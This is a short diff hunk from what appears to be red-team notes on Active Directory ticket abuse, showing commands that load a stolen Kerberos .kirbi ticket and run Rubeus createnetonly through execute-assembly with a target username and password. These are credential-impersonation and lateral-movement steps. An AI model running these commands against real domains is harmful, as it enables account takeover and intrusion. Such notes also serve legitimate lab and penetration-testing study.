@@ -36,7 +36,6 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
 run klist
 ```
 
-
 ## Rubeus way
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
